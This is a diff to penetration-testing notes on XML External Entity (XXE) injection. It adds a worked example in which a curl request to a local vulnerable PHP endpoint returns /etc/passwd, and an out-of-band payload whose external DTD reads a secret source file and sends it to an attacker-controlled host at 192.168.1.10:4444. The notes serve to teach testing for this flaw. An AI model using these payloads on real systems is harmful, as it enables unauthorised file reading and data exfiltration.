@@ -68,7 +68,7 @@ So if an application receives XML to the server the attacker might be able to ex
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
 
-The elemet can be whatever, it doesn't matter. The xxe is the "variable" where the content of /dev/random get stored. And by dereferencing it in the foo-tag the content gets outputted.This way an attacker might be able to read files from the local system, like boot.ini or passwd. SYSTEM means that what is to be included can be found locally on the filesystem.
+The element can be whatever, it doesn't matter. The xxe is the "variable" where the content of /dev/random get stored. And by dereferencing it in the foo-tag the content gets outputted.This way an attacker might be able to read files from the local system, like boot.ini or passwd. SYSTEM means that what is to be included can be found locally on the filesystem.
 
 In php-applications where the expect module is loaded it is possible to get RCE. It is not a very common vulnerability, but still good to know.
 
@@ -100,21 +100,91 @@ If "testdata" gets reflected then it is vulnerable to XXE. If it gets reflected 
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
 
-Another way to test it is to see if the server tries to download the external script. Firs t you need to set up your own webserver, and then wait for it to connect.
+Another way to test it is to see if the server tries to download the external script. First you need to set up your own webserver, and then wait for it to connect.
 
 ```
 <!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://192.168.1.101/fil.txt">]><test>&xxe;</test>
 ```
 
+### Another example
+
+Contents of xml.txt
+
+```
+<creds>
+    <user>Ed</user>
+    <pass>mypass</pass>
+</creds>
+```
+
+curl -d @xml.txt http://localhost/xml\_injectable.php
+
+returns
+
+You have logged in as user Ed
+
+Let’s modify the xml.txt file to contain the following code:
+
+```
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
+```
+
+Now "curl -d @xml.txt http://localhost/xml\_injectable.php"  returns:
+
+```
+You have logged in as user root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+```
+
+### Fun with dtd \(WIP\)
+
+Modified xml
+
+```
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY % extentity SYSTEM "http://192.168.1.10:4444/evil.dtd">
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
+    %extentity;
+    %inception;
+    %sendit;
+    ]
+<
+```
+
+### contents of dtd
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % stolendata SYSTEM "file:///c:/inetpub/wwwroot/Views/secret_source.cshtml">
+<!ENTITY % inception "<!ENTITY % sendit SYSTEM 'http://192.168.1.10:4444/?%stolendata;'>">
+```
+
 ### Exfiltrate data through URL
 
-https://blog.bugcrowd.com/advice-from-a-researcher-xxe/
+[https://blog.bugcrowd.com/advice-from-a-researcher-xxe/](https://blog.bugcrowd.com/advice-from-a-researcher-xxe/)
 
 ### References
+
+https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection
+
+https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities
 
 [https://securitytraning.com/xml-external-entity-xxe-xml-injection-web-for-pentester/](https://securitytraning.com/xml-external-entity-xxe-xml-injection-web-for-pentester/)
 
 [https://blog.bugcrowd.com/advice-from-a-researcher-xxe/](https://blog.bugcrowd.com/advice-from-a-researcher-xxe/)
 
-http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html
+[http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html](http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html)
 
